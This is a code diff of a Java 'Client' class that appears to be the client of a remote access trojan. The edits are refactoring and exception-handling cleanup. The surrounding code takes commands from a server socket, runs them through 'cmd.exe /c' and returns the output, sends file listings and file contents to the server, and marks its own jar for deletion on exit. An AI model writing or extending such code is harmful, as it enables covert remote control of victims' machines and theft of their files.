@@ -63,7 +63,7 @@ public class Client {
                 } else if (comm.contains("FILELIST")) {
                     communicate("FILELIST");
                     sendFileList();
-                }else if (comm.contains("DOWNLOAD")) {
+                } else if (comm.contains("DOWNLOAD")) {
                     communicate("DOWNLOAD");
                     sendFile();
                 } else if (comm.equals("EXIT")) {
@@ -71,6 +71,7 @@ public class Client {
                     File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
                     System.out.println(f.toString());
                     f.deleteOnExit();
+                    socket.close();
                     System.exit(0);
                 }
             }
@@ -83,25 +84,29 @@ public class Client {
     }
 
     /* Sends a message to the Server. */
-    private void communicate(String msg) throws IOException {
+    private void communicate(String msg) {
         Writer writer = new OutputStreamWriter(out);
-        writer.write(msg);
-        writer.flush();
+        try {
+            writer.write(msg);
+            writer.flush();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     /* Execute a command using Java's Runtime. */
-    private void exec(String command) throws InterruptedException {
+    private void exec(String command) {
         if (!command.equals("")) {
             try {
                 ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
                 pb.redirectErrorStream(true);
                 Process proc = pb.start();
-                String line;
                 communicate("CMD");
                 try (BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
                      DataOutputStream dos = new DataOutputStream(bos);
                      BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()))) {
                     ArrayList<String> output = new ArrayList<>();
+                    String line;
                     while ((line = in.readLine()) != null) {
                         output.add(line);
                     }
@@ -114,6 +119,8 @@ public class Client {
                     in.close();
                 } catch (IOException e) {
                     exec("");
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
                 }
             } catch (IOException e) {
                 exec("");
@@ -181,7 +188,7 @@ public class Client {
             BufferedInputStream bs = new BufferedInputStream(fis);
 
             int fbyte;
-            while((fbyte = bs.read()) != -1) {
+            while ((fbyte = bs.read()) != -1) {
                 bos.write(fbyte);
 
             }
